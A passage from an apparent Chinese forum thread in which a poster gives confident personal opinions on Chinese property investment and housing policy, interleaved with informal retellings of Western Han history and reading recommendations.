后来有一天，刘恒想起了贾谊，找他来中央谈话。贾谊一见皇帝立刻滔滔不绝，把皇帝立马侃晕了。 刘恒想：我靠，这厮死不悔改，留着没用，有多远滚多远吧。 再次把贾谊贬到了梁国。 贾谊不多久就死了。 关于魏豹和薄姬是否有一腿，也不好就肯定，也是个悬疑。因为记载薄姬的版本太多，我国古代人也比较八卦，呵呵。 kkndme 推荐的历史书 welldayzwb： 这个帖子最大的感受就是应该认真读一下历史了，麻烦楼主给列个入门级的书单，鉴于我的历史水平只有演艺级的，书单请尽量入门级，当然演绎过的就免了，别读历史还别人顺带洗脑，比较郁闷了 先再次表示感谢！ kkndme： 比较浅显的是\"史记\"，入门级基本都读的懂。如果开始觉得部头太大，觉得累，刚开始可以从\"古文观止\"入门。逐渐增加难度。 入门以后，很多古文就好读了。 现代翻译的一般都加工的比较多，同一部历史可能有无数个解释。象易中天和当年明月，都是写的不错的。 关于古文观止，很多文章都曾被节选进中小学课本，篇篇堪称经典，其中就包括贾谊的\"过秦论\"。不看过秦论真的不知道贾谊的才华呀。所以想读读历史的童鞋，不妨回过头再温习温习古文观止，边品茶边看，真是一种享受。 EchoMa9999： 楼主晚上好！ 我看之前有跟贴的朋友提过，请楼主列个史书入门级的书单，我不求列了很多书的书单，只请楼主推荐三本，佛渡有缘人，楼主，望不吝赐书名，先谢了！ kkndme： 我觉得读史最基本的就是古文观止，读了古文观止，有了功底，再读其他的就好读了。 开始读的时候，通史类是很难看得进去的，象\"资治通鉴类\"的也不好读，因为\"资治通鉴\"应当算评史算不上史书。 入门开读的话还是选择文学性强的比较好读，故事性趣味性都高，比如\"史记\"\"三国志\"\"汉书\"。 有了兴趣再读大部头的\"宋史\"\"明史\" 现代编写的中国史纲之类的就不要读了，纯粹洗脑，很多加工过的历史类读物就是瞎扯。 特别是： 千万不要读\"中国通史\"那样的垃圾!!!!!!!! 一定要读懂原文，跟中国通史讲得完全不是一回事。读不懂原文宁可不读，也不要让中国通史洗脑。 打工不易： 请问楼主，范文澜的《中国通史》也不值一读吗？ kkndme： 从始至终以唯物主义角度阐述的历史，可信度究竟有多高？ 唯物主义要很深的理解，比如子虚乌有的抢渡大渡河，就是唯物主义的杰作。 范对封建社会的理解，也很有问题，是唯物主义的需要，不能还原历史的真实 welldayzwb： 这个唯物主义的定义是什么？ kkndme： 我只能用唯物主义这个词，再直白就和谐了，呵呵 我们的历史教科书很多都出自中国通史，但是你真正熟读了史官的著作以后，发现那有多扯，歪曲的有点太不靠谱。中国通史我把它定义成政治类书籍，是政治需要产生的，专门用于洗脑，不能当史书读。 EchoMa9999： 楼主，简单研究了一下古文观止/三国志/汉书/后汉书/史记，古文观止，以目前的水平，看起来着实吃力，决定还是先从史记开始看起吧 淘宝上搜了一下，史记 （全四册），北方文艺出版社出版，2007年9月1号出版的，萧枫主编，绣像本，盒装， 这个版本的买来自读加收藏，可以吗？请楼主点评，谢谢！ kkndme： 古文观止可以买带注解的，但不要带译文的，看译文对读原文是有害的，可以通过注解提高古文水平。 史记买太好的版本，我是舍不得拿出来读，不能勾勾画画，我一定会把它高束焉,庋藏焉。读史记，最好买个普通本，带注解的，方便阅读，可边读边勾画，以提高阅读水平。 年轻人要早买房 GGKMM： 看了三天，终于看完了。。有些是一眼带过的，有些是比较认真的看下来的； 感觉回帖的筒子大多数都挺有钱的啊，至少相对我来说。因为都在计划一二百万的房子了。 本人在福州，目前月薪只有4K，但是福州市区的房产均价已经越过一万了，市中心的更是到了1.5万这样高不可及的地步。我就那楼主口中那种民企私企的体制外的P民了，属于自生自灭型的。但也还是得活下去啊，今年也二十五了，过两年也要结婚了。房子成为不可避免的头等大事； 不知道楼主对福州这样一个三线或者四线城市的房产怎么看待？平均工资水平约2000，有钱人据自己观察应该不少，至少超过20%的福州人口（有关这个，从大街上越来越多的好车做判断的，或许数字不准，但有钱人不少是肯定的）。如果在郊区能找到六千左右的小户型（65平左右），首付（还得存两年或者去借钱）自己掏，剩下的做货款，因为家里实在是没办法再支援了。这样的话应该还可承受，前提是付房贷的这二十年或者十五年里不失业。。 希望楼主给分析分析，写得有点乱。。。 kkndme： 25岁不是考虑失业的年龄，35岁体制外没有混出来的群众才应该考虑失业问题。 所以房子一定要趁年轻买，刚开始钱不够，就不要计较太多，先买个小的，以后有能力再换，如果没混出来，以后起码有个自己的窝住。不至于租房子被人赶出来。 福州是有点尴尬，明明是省会，又比不过厦门，不过市区1万左右的房价，在省会城市里真的谈不上高。你是自住，你又不打算去厦门生活，所以你该买还是得买。福州的房价也许涨得没那么块，但是也不可能跌。 不要低估通货膨胀 someway2010： 跟楼主请教一下： 楼主怎么看知春里小区的房子？那边连着双榆树小区，有大片的老房子，都是6层的板楼，都是上世纪8、90年代建的。环境看起来有点乱，以前的老公房，原单位早就没了，物业基本等于没有。将来拆迁的可能性有多大？值得买不？ kkndme:： 只要是4环内保值升值不会有问题，那个位置还是可以。关键是看投资还是自住，如果是自住，我就觉得那边有点乱糟糟的，不舒服。挨着中关村其实住着都不舒服，但不耽误升值。 someway2010： 多谢楼主，是自住~因为老公在中关村上班，想离公司近些，所以就挑了那里~是挺乱的，唉~ 希望以后等我们有钱了能换个别的地方的大房子，不过按照楼主的分析这个是极有可能实现不了了。。。5555~~~~~~ 再问一个，现在市场上卖200w的房子，十年后大概会涨到多少钱？麻烦楼主 kkndme:： 80年代你想象不出以后一瓶茅台会卖1000块 现在你同样想象不出十年后你的房子能卖多少钱。 那时也许人民币都是1000块一张的 二三线城市与重庆 dali_05： 浏览了楼主观点，和我之前的货币推动楼市的看法完全一致 但由于无法像楼主那样掌握一些基础数据，对一些楼市的演变细节还有几个疑问 ，还请lz指点 （1）二三线城市在这轮调控中的增长不出意料，但是二三线城市的房价增长，我始终认为存在一个最终谁接盘的问题。我是重庆人，以重庆为例，这个城市代表了典型的二三线城市。外来人口少，特别是外来的普通白领阶层。据我了解的数据，2008年之前，重庆的具备房子购买力的人群任然是净流出。到08年后才得以改观。但是流入任然缓慢，这也就是意味着重庆的楼市将没有长期稳定的接盘群体。而本地人，没有房子的是非常少的。在没有外来人群接盘的情况下，本地人在有房的情况下，任然投资囤积房产，最终，这些房产将如何变现。 一句话，房价要持续的上涨，还得有没房者接盘，而且这些人还得要有购买力。多次购房者无法稳定的解决这个问题。那么我就有理由对这样的二三线城市的房产前景表示担忧。 kkndme： 重庆房价的上涨得益于zy的战略规划，打造中国的大后方，把重庆的经济发展提升到了政治的高度。因为如果发生战争，重庆将变成第二首都，是中国最安全的大后方，蒋同志就很有眼光的选择过重庆。 重庆并不是以城中心为核心向外辐射的城市，繁华区域相对比较分散，所以房价很难快速上涨。这也就是过去重庆长期滞涨的原因。 重庆房价的崛起可以说完全是中央规划概念推动的，至于日后是否会吸引大量的精英和富人来重庆发展，我想一定可以。作为上升到国家政治高度的发展计划，就算是代价再大，也一定会搞得起来。 dali_05： （2）高端房产还是普通住宅？ 看了lz的观点，认为高端房产，由于其稀缺性，更具价值。 但我认为，房产和古玩还是存在差别的。古玩最大的价值在于收藏把玩，只要有钱，买再多古玩来玩都无所谓。但是房产不一样，房产的价值除了和古玩一样的投资外，真正的功能在于居住。但是目前的二三线城市，精英阶层的数量是非常有限的，他们谁没个3，5套别墅，在没有外来精英加入购买的前提下，这些高端的房产也就是在精英圈子中流转，这样封闭的流转，如何实现价值的增长呢？ 要知道，在2，3线城市，普通白领阶层能跳出自己的阶层而具备购买高端房产能力的概率是非常小的，不具有代表性。那这些每个富人，有权人都有很多的高端房产有什么价值可言？ 而普通住宅由于有普通白领的接盘，是否投资价值更大？ kkndme： 二三线城市房价的支撑，要因城市而异的，大体上二三线城市的核心区域与高端住宅区都不会有问题。毕竟一线城市的体量，不可能满足全国中产以上群体定居，而且一线城市随着竞争的日益激烈，钱也不是那么好赚的。有很大比例的富裕人群仍会选择二三线城市生活。 中国的二三线城市的富裕人口，要比大家想象的多的多，特别是二三线城市，有相当比例的人口都有较高的隐性收入，权力寻租现象更为严重。 dali_05： （3）长期持有房产的变数 中国房产只有70年，甚至50年的使用权，如果长期持有，随着时间推移，房产价值是否会受到影响。因为我在重庆，这个问题尤其严重，重庆只有50年。 如果我只是持有，出租。那我的租金将是较低的（相对房价而言），因为zf不会允许房租像房价那样疯涨，原因和粮食问题一样，基本需求嘛。那有可能50年到了，我的房租收益实际上还抵不上房款的综合支出。而那时房子早就是危房了，强拆将是完全可能的情况。那做为普通人，怎么可能和zf在赔偿上博弈。这个风险lz是怎么理解的？？ 我的理解是，房子不能长期持有，必须在5年左右变现，否则将存在贬值和变现难度加大的风险，请lz指点 kkndme： 关于中国的房产能够持有多少年的问题，这要持续观察zf的动向。对于现在的80后来说，如果在有生之年能够平安度过，不经历大的动乱，已经是很值得庆幸了。 如果有动乱发生，即使你没有买房，你手中的现金也将变成废纸。 dali_05： （4）天津现象（或者即将出现的重庆现象） 天津房价在二线城市中增长是惊人的，但收入水平并没有达到那样的高度。这种依靠所谓开发区吸引资金推动房价的模式，是否具备可持续性？？ 我认为真正的天津常住精英阶层的资金实力是无法支撑这样的价格的，只能理解是外来游资的介入，推高了价格。 我想问的是，这些游资有可能退去吗，一旦退去，面临的风险是否很大。 据我的理解，中国真正成功的开发区，都是由于本身的条件好，而非开发区本身的作用。 比如深圳，享受的是经济转型的首发政策优势。上海浦东是由于本身就实力雄厚。而所谓的滨海新区，重庆两江新区，本身实力就不过如此，即使要真正实力上来，那也将是非常漫长的过程。那这些进入房地产的游资，将在概念炒作一遍之后，获得一定收益后撤出，一旦撤出，这些地区的房价将会是怎样的趋势？ 放眼中国，房价高的地方无不是富人集中，或周边富人多的区域。天津重庆这样的地方，一旦外地资金撤出，将何去何从？ （5）新兴城区和老核心城区 新兴城区环境好，轨道交通也使得原本偏远的新兴城区变得方便起来。那老核心城区的房产是否不如这样的新兴城区有价值。这个问题一直很困惑。因为我是重庆人，这个问题尤其明显。现在重庆房价最高的是以前的郊区，江北，渝北。而传统的渝中，房价反而排着中等水平。这和北京的一二环贵，上海的黄埔徐汇贵完全不同。这样的状况具备可持续性吗，还是仅仅是阶段性的。但是感觉现在zf的规划更倾向于向外发展，避免主城区拆迁的高成本，这会否导致传统主城区的边缘化 先问这几个问题，困惑很久了，期待lz的高论 城区和郊区 hey-hey： 楼主 我在上海， 小白领一枚。最近想买房。稍微好点的区均价已经至少2万5+了， 现在考虑在其他价格洼地的区买套新房，看中了均价1万7左右，买90送30，到手面积120左右。此楼盘开发建造定位2万/米以上，因政策调控，故现1万7。好处是小区规划不错，属大型国企房产公司，2012年交房。附近有超大型公园，地铁明年开通（升值利好），附近有医院，学校，路上看到的在建建筑较多（百废待兴）。不好处是离上班开车要1个小时，属工业区（在另外一个方向），路上集卡较多，有传空气质量不好。 另外一个选择是在市中心或其他比较好的区买个小房子，大概5、60平方米左右，预算也是180万左右。 好处是地段好，租金回报可能较高。如果自住相对比较方便。 单身，买房投资愿望大于自住愿望。 请楼主给分析分析。谢谢 kkndme： 多数人买房子都是郊区买个大的，后来上班实在不方便，再想办法城里买套小的。住郊区牺牲时间，住城里牺牲面积。总得来说，还是住城里更方便些。 关于房价升值，一定是郊区和城区版块轮动的。当郊区房价较低时，资金就会关注价值洼地，当郊区房价炒起来以后，城区的房价跟着上涨，但总的来说，城区的房价涨幅一定高于郊区，且比郊区更抗跌。 hey-hey： 谢谢楼主。真是纠结阿。一样的钱想买个新点的。而且周边的觉着还有这样那样的优势，比如公园，比如现在的性价比。比如大了一倍。比如该区未来发展空间和前途。如路建好了地铁修好了，城市辐射发展的面扩展了。 市区现在虽然完善，但未来没什么发展空间，该发展的都饱和了该配套的都配好了。升值的空间是否相对就小了。 还请楼主再给说说。 kkndme： 你说的其实还是性价比的问题，比如郊区（前提是配套能发展的起来）1万7，城区2万5，那肯定是选择城区，毕竟相差不大。如果郊区1万7，城区3万以上，那肯定选择郊区。 好比北京的通州，城区2万的时候，通州8000，肯定选择通州，升值会快。但城区3万，通州2万5的时候，肯定会选城区。 守着金碗要饭吃 守着金碗要饭吃，最典型的就是老一辈玩田黄寿山石的，收藏了一屋子石头，穷了大半辈子，第一次参加石头交易会，居然发现自己随便拿块石头出来能卖上千万。 人制的社会，人就是制度 让李荣融来讲垄断巨头的功劳，这个事很有意思。 西汉时期，功臣集团和他们的后人势力比较大，大街上瞎晃的黑社会头子比较多，皇帝提倡以法治国，靠法律来制约功臣集团，先是重用了皇宫守大门出身的张释之大法官。 张法官完全按法律办事，该杀头的绝不会流放，但是该流放的也绝不会杀头。张大法官实现了我国历代百姓追求的天下无冤民的梦想。 史书上记录：汉文帝车驾过中渭桥，一个人从桥底下突然钻出来把皇帝的御马惊了，刘恒很生气，让张法官治他的罪。张法官审讯后发现是个意外，属于民事事件，打算罚点钱放掉。刘恒不干了，那可是惊了圣驾呀。罪该杀头。张法官却认为：律条上没有说因意外惊了圣驾就必须杀头，按律条就应该罚钱放人。要不然陛下你就不要把这个人交给我审，直接杀掉算了。既然陛下让我审，就必须按法律办事。刘恒只好按照张法官的审判结果，放掉了那个人。 其实，遵守法律，按照法律办事的不仅仅是张法官，而是刘恒自己。刘恒为了保证社会安定、基业长青，就必须限制特权阶层，限制特权阶层就必须依法治国。 但是文景之后，武帝就不满足于完全依法办事的张释之法官这样的人了，而是开始重用酷吏，张汤、义纵、宁成这些新一代法官登上了历史舞台。法律是什么？法律就是张汤，张汤就是法律，犯了法的要往死理打，没犯法的也要往死里打。 唐朝武则天时期，出现了一个史无前例的酷吏：来俊臣。 来俊臣法官不管法律专搞冤狱，专门养了一大群打手无赖，凡是武则天不喜欢的人，还有他自己不喜欢的人，一律刑讯逼供，屈打成招。发明的酷刑比张汤有过之而无不及。 古代，法律是什么？是皇帝？是张释之？是张汤? 是来俊臣？其实，法律什么都不是。 准公务员的好处 xufangliang1120： 楼主，请问新进公务员队伍的人员今后还会不会有住房福利。像年纪大的都有分房或定向开发的商品房，已经分过了。象新进来的，工资不高，每月不到2000，平时无任何待遇，过年也就发个千来快意思意思。我在湖南常德，这里的房价也在4000左右，今年涨起来的。象我们这种情况要怎么办才好？请您指教！！谢谢！ kkndme： 大哥，公务员也是有级别的，想想宋江为什么上梁山呢？ 你要是在重要部门，或者到了级别自然就有了。 西汉的张释之，冯唐、郅都都是皇宫守大门的出身。皇宫看大门的，不算是公务员，是体制外编外人员，相当于协管员，连工资都不发，但为什么大家都趋之若鹜的争当皇宫传达室老大爷这种有前途的职业？因为，可以有机会见到皇上，有机会成为高级公务员。当上了高级公务员，你就有了票子房子妹子。 最著名的皇宫传达室看门老大爷叫冯唐，头发都白了还在未央宫值班呢。皇帝刘恒没事瞎溜达，看见老大爷一脑袋白头发，就叫过来神侃。不侃则已，一侃才知道冯大爷的爷爷是赵国的官帅将，跟大名鼎鼎的名将李牧是哥们。而且冯大爷不愧是名将之后，太懂带兵打仗的道道了。 刘恒说：我要是能有李牧这样的大将，还怕什么匈奴啊。 冯唐很牛叉的说：就是有李牧这样的大将，也得不到重用。 冯大爷直接把皇帝气晕，皇帝转身就走了。 后来刘恒气消了，又找冯大爷问话。 冯大爷就说了一番大道理： 对待将士，要以激励为主，才能得到将士拼死效力的心。重惩罚，轻奖励，光拿大棒不掏胡萝卜，将士怎么肯用命呢？（皇帝是信奉法家的，法家的精神领袖商鞅同志认为管理手下最高境界就是基本不怎么用胡萝卜，直接用大棒的最牛——罚九赏一。） 云中太守魏尚是个名将，让匈奴文风丧胆。魏尚的手下都是农民子弟，魏尚对待士兵很好，很舍得犒劳，也和舍得给钱，所以大家都很拼命。但是陛下您经常因为军兵的一点小错误，就扣掉军兵的赏赐，因为魏尚虚报了几个斩获的首级数量，就把魏尚抓起来关监狱，奖励太轻，而惩罚太重了。所以说陛下有李牧这样的良将也不能重用。 刘恒大悟，拜冯大爷为车骑都尉。 唐代的王勃，很不得志，于是写了《秋日登洪府滕王阁饯别序》:\"嗟乎!时运不齐，命途多舛;冯唐易老,李广难封。\" 冯大爷一下子因为王勃的文学作品，家喻户晓了。 小城市房价会因为人民币贬值涨价，但依然难变现 xufangliang1120： 楼主,谢谢您的回复! 你您怎么看常德的房价呢,那我们现在还是想点办法先买房? kkndme： 买一套自住房还是应该的，不是所有公务员都能够上位，也不是所有公务员能够分到房子，特别是二线以上城市，将来普通的底层公务员住公租房的可能性更大。 对于小城市，房价也会因为人民币的贬值而上涨，只是可能不如大城市好变现而已。所以，有能力还是应该买一套自住房的。 一线杭州 钱江风帆： 看了个通宵啊，不知楼主对杭州了不了解，目前市区大概25000/m2,杭州未来房价的趋势如何？ kkndme： 杭州我都当一线城市看的，你就当一线城市理解。富人的天堂，房价多高都不稀奇 二三线城市的发展靠拆迁 dali_05： 支持楼主房价大涨房租必涨的观点 但是这仅限于外来人口众多的一线城市 二三线城市本地人几乎没有没房的，如果算上父母的，将来普遍一个家庭拥有两套以上的房子 房租也就失去了大涨的基础 唯一可导致房租上涨的就是拆迁，一旦便宜的旧房子少了，房租肯定是要上调的 但那也是有限的 总之，外来人口极其可支配收入是房租的决定性因素 kkndme： 二三线城市的敛财和追求政绩方式，全靠大规模拆迁，城市搞升级改造，这个拆迁规模是一线城市市民难以想象的。有的城市已经搞得如火如荼了，有的城市还没开始，但都会走这一步。 转篇文章：一个忽悠了几亿中国人的伪概念：所谓\"中国房地产泡沫\" 中年不惑吗： 一个忽悠了几亿中国人的伪概念-所谓\"中国房地产泡沫\" 作者：罗伯特卡帕 中国大陆大家目前最为关心，讨论最为热烈的一个问题就是中国的房地产泡沫问题。从政府到民间，从经济专家到普通百姓，大家都在关注这个问题。以前，我也觉得中国存在一个叫\"中国房地产泡沫\"的所谓概念，但今天我忽然感悟，原来多少年来包括我在内的几亿中国人都被蒙骗了，中国根本就不存在所谓\"房地产泡沫\"的问题，\"房地产泡沫\"这个概念本身就是一个伪概念。 如同市场经济一样，房地产泡沫也是一个外来事物，它是市场经济的产物。但问题是，中国是市场经济吗？显然不是，否则为什么大多数西方国家都不承认中国是一个市场经济国家。尤其是中国大陆的房地产市场，更不是市场经济，而是计划经济与市场经济相结合的一个怪物，政府操纵着房地产行业，政府对房地产有着绝对的掌控能力。 房地产泡沫是市场经济的产物，既然是泡沫，那么这个泡沫也会遵循市场经济的规律，即当泡沫足够大的时候，会破裂。因为日本与美国的经济是市场经济，所以当日本与美国的房地产产生泡沫的时候，就会破裂。 目前包括中国在内的几乎所有世界经济学家都以为，当年日本与美国的房地产泡沫破裂了，中国的房地产泡沫比日美大几倍，当然也会破裂。事实却是，中国的房地产泡沫在几年年前的膨胀程度就超过了当年日本与美国的房地产泡沫，中国的泡沫几年来虽然翻倍，但却没有破裂，这是何故？显然，经济学家们犯了一个错误，那就是把中国的房地产乃至中国经济当成了市场经济来看待，而事实是中国的房地产市场根本不是市场经济。所以，西方市场经济国家所有的房地产泡沫，在中国也根本不存在，所谓的\"中国房地产泡沫\"根本就是一个伪概念。 当然，我说到这里时，肯定有很多人不服气，中国的房地产明明几年之内翻了很多倍，远远超过了普通人的收入水平，这不是泡沫这是什么？我的回答是，中国的房地产价格确实虚高，远远超过普通人的收入水平，这是事实，但这不是\"房地产泡沫\"，因为泡沫会破，而中国的这个被大家称为\"泡沫\"的东西却不会破，因为它的真实名字其实不叫泡沫，应该叫\"变相的税收\"或者\"房地产垄断价格\"。 中国的房地产业本质上已经不是一种行业，像中国大陆的税收与垄断行业的垄断价格一样，成了少数人剥夺多数人财富的一种工具。在这个工具上，寄生着很多食利者。这个食物链的最上层为地方政府，地方政府通过卖地与房地产税收，养着一大批高薪的公务员及满足他们的奢侈需求。食物链的第二层为与官员勾结的房地产商以及受贿吃回扣的官员，第三层是炒房者，炒房者相当部分为拥有大量现金的官员及家属。 市场经济的泡沫会破裂的，但中国的房地产不是市场经济，房地产价格也不是\"泡沫\"，所以它也不会破裂。中国的房地产价格被政府严格操控着，不说是操控自如，也是有绝对的控制力。因为政府掌控着土地银行汇率等房地产的关键要素。中国的高税收是泡沫吗？中国的垄断行业的高垄断价格如水价电价油价是泡沫吗？当然不是，他们是转移财富的手段。中国的房地产价格也是一种变相的\"税收与垄断价格\"，其\"税率\"与\"垄断价格\"是政府控制的。这也解释了为何中国几年来房价如此之高，却不下跌，所谓\"泡沫\"却不破裂的原因。 中国房地产的所谓\"泡沫\"会\"破裂\"吗？会，只要政府愿意。中国的房地产的\"泡沫\"会不破裂吗？会，只要政府愿意。 其实，中国所有的问题都是政治问题，而不是经济问题，离开政治谈经济，永远找不到问题的答案。 拆迁补偿 拆迁补偿的两种方式：1、现金补偿；2、回迁安置。 在二三线及以下城市，通常采用第二种，因为多数开发商没有钱现金补偿，房地产开发基本上是靠zf关系，空手套白狼，就是有钱也不愿意拿出来。 对于拆迁户来说，现金补偿也不划算，因为补偿的现金在与原地同级别的位置肯定是买不了相同面积的住房的，所以多数拆迁户选择回迁安置。 但是越小的城市开发新盘的速度越慢，往往回迁房盖个三五年也不见得盖得起来。在这期间，开发商会按月补偿拆迁户一定的租金，用于过渡。 手里现金多的拆迁户会先买房住，慢慢等拆迁，但是现金不多的拆迁户，就不得不拿着开发商的过渡款租房住。通常这笔过渡款都要高于相同位置的租金，所以拆迁户就把房租炒起来了。 北京已经没有原地回迁的说法了，一线城市，还有部分较发达的二线城市都不搞原地回迁了，土著一旦拆迁了就赶到郊区。反而是二、三线城市，特别是三线以下城市多数还在搞原地回迁。主要原因是城市小，住户多多少少都有些背景，特别是单位的老公房，开发商不让原地回迁，根本就拆不动，阻力太大。 房子从拆到迁是有时间的，快的情况是1年多，但很多情况都是拆迁安置房3,4年盖不起来。比如昆明的莲花池片区，大概是06年左右拆迁的，但拆迁安置房现在才开始动工，2012年才盖的起来。这种事情并不是个案。 贵州更离谱，房子04年拆了就再也没有音讯，开发商一直盖不起来，到现在都6年了。原来的拆迁户，现在还在租房住。 城市底层 游泳横渡马六甲： 经常有人说收入是决定因素，其实人均收入没有意义。北京姑娘去外企做前台一个月2000，和公司外地姑娘拿这么多，和做公务员的外地姑娘拿这些，生活成本天差地远。不是说有10万个月入2000的外来人口，四环内就有一万处他们能承受的住房。而个体的外来人口的支出，会随着生活成本调整。开始很难理解月入两三千的白领在北京市如何生活，毕竟他们不可能像楼下卖蔬菜水果的大叔那样，炖点猪肉粉条就算开荤，穿特价五块的汗衫就算工作服。一样的月入，白领的幸福起点高得多。后来知道他们原先偶尔用兰蔻改成一直用大宝，早餐不再喝豆浆，住单位附近的搬到五环外，有人在燕郊买了房……突然想起小时候学新概念英语，说起蓝领工资比白领高，但还有人为了能西装革履宁可减薪做白领。 对80后而言，最恐怖的绝不是房价，而是养老。这也不是计生的问题，一个社会的生活资源是有限的，老龄化早晚会到来，为了改变老龄化呼吁多生育，那是饮鸩止渴。等多生出来这部分老了，再这么循环？而福利社会如英国是50多岁的人最幸福，有稳定养老金，二三十岁最痛苦，看不到未来依靠。家底不厚的像希腊，透支做社会福利，后果还不如不做。中国则是取不足以奉有余，竭全民之力供特权阶层挥霍，没有哪个年龄段享受过全民福利，还得共同面对养老难题。房子，真不算此生最纠结的事 kkndme： 正是如此，以后城市的底层吃饭都是问题，zf最喜欢拿房子说事转移矛盾 垄断企业 我们的垄断企业其实都是第二税务局的角色，比如石油、移动、电力、水务、地产、银行等等。zf一定要掏空百姓的钱包，所以说什么泡沫不泡沫，就是个笑话 农村自来水 说起农村建自来水更搞笑，亲眼目睹要不然真不敢相信。 贵州有个村子，以前，自来水是村子集体出钱买的管子，然后全村出劳力从山上接下来（用的山泉水），要是水管坏了，大家再摊钱摊劳动力修。 结果zf不愿意了，说他们修的不规范，zf给重新修，还是从山泉引水下来，zf包给工程队换了一下管子，然后每户给按了水表，安好了以后，要按照2块钱一吨收费，全村都炸了窝了，集体抗议，现在还没有结果。 袁盎 丛林社会就是要承认人与人之间的差别，性格决定命运。 我要讲一个奇人，这个人叫袁盎。故事的出处是《史记·袁盎晁错列传》，如果鸡冻同志认为我瞎编，可以自己去看原文。 袁盎同志的神奇是一般人都无法想象的，这个奇人在吴国当相国的时候，他手下的一个小公务员跟老袁同志的爱妾乱搞，经常背着老袁嘿咻嘿咻。老袁知道了这个事就装聋作哑。 有人跟那个小公务员说:坏了，你跟袁领导的二奶私通的事让袁领导知道了，你死定了。 小公务员一听吓坏了，骑了马就跑，公务员这份全世界最令人羡慕的工作也不要了。 小公务员一跑，袁领导就使劲追，小公务员就更拼命跑，袁领导就更拼命追。袁领导的马要好一点，跑的快，终于把小公务员追上了。小公务员只好下马等死。 袁领导急了，对小公务员说：你跑什么呀？我正打算把我的二奶送给你。兄弟如手足，妻子如衣服。大概就是这个意思。 小公务员感激涕零，抱着袁领导的二奶继续嘿咻。 所以说老袁这人最仗义，人缘最好。上下都买他的帐。 老袁也有个把敌人。老袁在皇宫里当小跟班的时候，得罪了汉文帝宠爱的一个太监叫赵谈的，所以特别害怕，怕赵太监哪天找茬把自己给黑了。 老袁征求了侄子的意见，认为自己应该先下手为强，应该当众侮辱一下赵太监，这样如果赵太监再黑自己，就没人信了，别人都以为是公报私仇。老袁的政治手腕还是相当高的。 一天，文帝刘恒跟找太监坐在一辆车子里外出，老袁上前拦住车子，大义凛然的说：能够跟天子共乘一车的，都是天下豪杰，天子怎么能跟一个没小鸡鸡的人坐一辆车呢？ 赵太监当场就气哭了，还不能说什么。以后赵太监要黑老袁，也没那么容易了，因为大家都知道老袁义正言辞，充满正义的得罪了赵太监，如果赵太监再说老袁坏话，就是公报私仇。 老袁的人缘是公认的好，但是在朝里有一个最大的敌人，就是大名鼎鼎的晁错。 晁错这个人学的是商鞅之术，法家的代表人物。为人冷酷，不讲人情，人缘特别差。老袁和晁错关系不好，可能跟两个人的性格很有关系。 晁错跟贾谊很有一拼，特别喜欢喷，口才也特别好，跟贾谊同志喷的内容也差不多，一会儿说打匈奴其实很简单啦，一会儿说必须削藩啦。刘恒听晁错喷的很有水平，很欣赏，但是刘恒不是傻子。 打匈奴？那得是国力强大以后的事，现在必须让老百姓修养生息。 削藩？我也想削藩，但是总得有合适时机才行啊，现在削藩不是逼人造反吗？ 刘恒对晁错这种人的态度就是，你建议你的，我听听就可以了，不能当真。 晁错同志懂得要想发达，必须选择一个有前途的职业，所以凭着他气死保险推销员的口才，当上太子的老师。这个太子就是汉景帝刘启。 晁错的时代终于来了，原因是刘恒挂掉了。 刘启生下来就是锦衣玉食，可没他老子那两下子，也不怎么懂帝王之术，晁错说什么就是什么。 晁错于是抖起来了，不知姓什么了，仗着是皇帝的老师，飞扬跋扈，人缘极差。晁老师最爱追求政绩，立刻提出削藩。 削藩的结果就是吴楚七国反了。 这个故事跟明代朱允文同志的削藩如出一辙。明朝朱允文同志削藩的结果就是朱棣反了，当了皇帝。朱允文被迫流浪，泡吉普赛美眉去了。 吴王不是朱棣，性格有点象袁绍，生性多疑，手下有人才不会用，所以没能成大事，被周亚夫跟干掉了。如果吴王能有朱棣的本事，汉朝的历史就会改写。 吴王一反，老袁就着急了。老袁给吴国当过相国，吴王造了反，晁错必然要借机宰了老袁，老袁觉得自己冤枉啊，吴王造反不是你晁错逼的吗？ 晁错果然趁机对老袁打击报复，安排了两个手下去弹劾老袁。但是晁错的人缘实在太差了，老袁的人缘实在太好了，那两个手下竟然不同意弹劾老袁。而且还劝晁错,大意是：现在七国兵马造反了，形式很危急，我们还搞内斗就不好了。老袁这个人是不可能参与谋反的。 晁错也着急叛乱的事，就把老袁放一边了。政治斗争，不是你死就是我活。 晁错错了，赔进了自己的老命。 窦婴同学也曾经在吴国当过相国，立刻跟老袁站在了一条战线上，准备给晁错来个致命一击。 晁错这个人的死，完全是他自己性格造成的，对人苛刻，政治上又是白痴。吴楚七国打着\"诛晁错，清君侧\"的名义造反，皇帝问晁错应该怎么办? 晁错的白痴精神充分发挥了出来，\"陛下您御驾亲征，臣留守长安，做好看家的工作。\" 皇帝估计当时心里要多愤怒有多愤怒。你自己惹的祸，你一个当臣子的在家躲起来，让我当天子的上去当炮灰，你是何居心? 不过刘启涵养好，没说出来。 这时候老袁跑了进来，说有平乱之计，要单独跟皇帝说。刘启很不客气的就把晁老师请了出去。 老袁立刻献计，既然反叛打着清君侧的名义，就先把晁老师宰了，叛军就出师无名了，就得不到老百姓的响应，事情就好办了。 刘启一听挺高兴，正恨晁老师让自己当炮灰的事呢，立刻同意，腰斩晁错。 晁错的下场要比贾谊惨多了。 不过老袁的下场也并不好。皇帝的老妈想让皇帝的弟弟梁王在刘启驾崩后继承皇帝这份工作，但是老袁不同意，坚决表示反对，得罪了梁王。 梁王不是一般的高级公务员，最喜欢搞黑社会，找了杀手把老袁干掉了。 这个故事又告诉我们，即使人缘再好，在政治斗争中活下来也是不容易的。 welldayzwb： 最好把历史故事表达的直白的意思讲出来，不排除观众里像我这么愚钝的人不少 kkndme： 我说的不是袁盎也不是晁错，说的是削藩，皇帝削藩怎么样？看看朱允文的下场，晁错几乎独揽了大权，削藩的下场是什么？腰斩。清查空置率，zf不参与一级开发，不是扯淡吗？ 二三线城市，选新城还是老城 wofuleyumin1： 楼主 我又有问题了。。。。请务必回答 谢谢 1。目前很多城市开发新城 我们主要谈二三线城市吧。。。这些地方的新城会超越老城吗？ 我们投资该投新城还是老城？ 比如成都 南边的天府新城，口号国际城南。。 2。投资一定投越靠市中心越好吗？ 比如成都，西三环是比东二环还好。。但未来2环是否最终比3环好？ kkndme： 拆迁是块硬骨头，不够铁腕的领导会避开破旧但繁华的老城区的问题，转而开发新城，所以往往形成倒挂，即新城一下子变成了新贵聚居区，新城的房价甚至高过老城区。 但这是一种倒挂，老城升级改造是必然的一步棋，只是时间的早晚。未来老城区的升级改造，老城区的价值就会凸显，价格要远远高于新城。 